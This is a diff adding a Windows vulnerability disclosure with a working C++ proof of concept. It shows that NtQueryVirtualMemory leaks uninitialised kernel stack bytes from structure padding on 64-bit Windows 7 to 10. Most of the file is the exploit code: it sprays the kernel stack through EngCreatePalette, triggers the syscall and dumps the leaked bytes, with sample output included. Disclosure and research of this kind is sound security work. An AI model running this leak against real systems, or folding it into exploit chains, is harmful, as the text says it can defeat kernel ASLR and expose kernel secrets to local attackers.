@@ -1,0 +1,133 @@
+/*
+We have discovered that the nt!NtQueryVirtualMemory system call invoked with the MemoryBasicInformation (0x0) and MemoryPrivilegedBasicInformation (0x8) information classes discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 7 to 10.
+
+Both information classes appear to return the same output structure, MEMORY_BASIC_INFORMATION:
+
+--- cut ---
+  typedef struct _MEMORY_BASIC_INFORMATION {
+    PVOID  BaseAddress;
+    PVOID  AllocationBase;
+    DWORD  AllocationProtect;
+    SIZE_T RegionSize;
+    DWORD  State;
+    DWORD  Protect;
+    DWORD  Type;
+  } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
+--- cut ---
+
+On x64 builds, the compiler introduces 4 bytes of padding between the "AllocationProtect" and "RegionSize" fields, in order to align the latter to an 8-byte boundary. Furthermore, 4 extra unused bytes are also added at the end of the structure, in order to align its size to an 8-byte boundary. None of these 8 unused bytes are initialized in the kernel's local copy of the structure, and so they are returned to the user-mode caller in this undefined form.
+
+The problem is best illustrated by running the attached proof-of-concept program, which sprays the kernel stack with a 0x41 ('A') marker byte, invokes the nt!NtQueryVirtualMemory syscall with the affected information classes, and prints the contents of the output buffer on the screen. The result of running it in our test Windows 10 environment is as follows:
+
+--- cut ---
+  ---------- MemoryBasicInformation Status: 0, Return Length: 30
+  00000000: 00 00 58 3d f6 7f 00 00 00 00 58 3d f6 7f 00 00 ..X=......X=....
+  00000010: 80 00 00 00 41 41 41 41 00 10 00 00 00 00 00 00 ....AAAA........
+  00000020: 00 10 00 00 02 00 00 00 00 00 00 01 41 41 41 41 ............AAAA
+  ---------- MemoryPrivilegedBasicInformation Status: 0, Return Length: 30
+  00000000: 00 00 58 3d f6 7f 00 00 00 00 58 3d f6 7f 00 00 ..X=......X=....
+  00000010: 80 00 00 00 41 41 41 41 00 10 00 00 00 00 00 00 ....AAAA........
+  00000020: 00 10 00 00 02 00 00 00 00 00 00 01 41 41 41 41 ............AAAA
+--- cut ---
+
+It is clearly visible that in both cases, the bytes returned at offsets 0x14-0x17 and 0x2c-0x2f originate from an uninitialized kernel stack region. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define MemoryBasicInformation ((MEMORY_INFORMATION_CLASS)0)
+#define MemoryPrivilegedBasicInformation ((MEMORY_INFORMATION_CLASS)8)
+
+extern "C" {
+  typedef DWORD MEMORY_INFORMATION_CLASS;
+  NTSTATUS NTAPI NtQueryVirtualMemory(
+    _In_      HANDLE                   ProcessHandle,
+    _In_opt_  PVOID                    BaseAddress,
+    _In_      MEMORY_INFORMATION_CLASS MemoryInformationClass,
+    _Out_     PVOID                    MemoryInformation,
+    _In_      SIZE_T                   MemoryInformationLength,
+    _Out_opt_ PSIZE_T                  ReturnLength
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(NTAPI *EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(NTAPI*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  static BYTE OutputBuffer[1024];
+
+  SprayKernelStack();
+
+  SIZE_T ReturnLength = 0;
+  NTSTATUS Status = NtQueryVirtualMemory(GetCurrentProcess(), GetModuleHandle(NULL), MemoryBasicInformation, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+
+  printf("---------- MemoryBasicInformation Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(OutputBuffer, ReturnLength);
+
+  SprayKernelStack();
+
+  ReturnLength = 0;
+  Status = NtQueryVirtualMemory(GetCurrentProcess(), GetModuleHandle(NULL), MemoryPrivilegedBasicInformation, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+
+  printf("---------- MemoryPrivilegedBasicInformation Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(OutputBuffer, ReturnLength);
+
+  return 0;
+}
